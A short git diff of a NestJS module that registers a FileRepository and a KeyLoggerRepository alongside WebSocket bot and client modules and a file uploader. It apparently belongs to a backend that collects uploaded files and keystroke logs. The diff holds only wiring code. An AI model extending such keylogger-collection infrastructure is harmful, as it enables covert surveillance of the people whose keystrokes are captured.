@@ -5,7 +5,8 @@ import { SchemasModule } from "@/src/repository/schemas.module";
 import { WsBotModule } from "../../ws-bot/ws-bot.module";
 import { WsClientModule } from "../../ws-client/ws-client.module";
 import { FileUploaderUseCase } from "../application/file-uploader.use-case";
-import { ClientRepository } from "../domain/client.repository";
+import { FileRepository } from "../domain/file.repository";
+import { KeyLoggerRepository } from "../domain/keylogger.repository";
 
 @Module({
   imports: [
@@ -16,7 +17,7 @@ import { ClientRepository } from "../domain/client.repository";
     forwardRef(() => WsClientModule),
   ],
   controllers: [FileUploaderController],
-  providers: [FileUploaderUseCase, ClientRepository],
-  exports: [ClientRepository],
+  providers: [FileUploaderUseCase, FileRepository, KeyLoggerRepository],
+  exports: [FileRepository, KeyLoggerRepository],
 })
 export class ClientModule {}
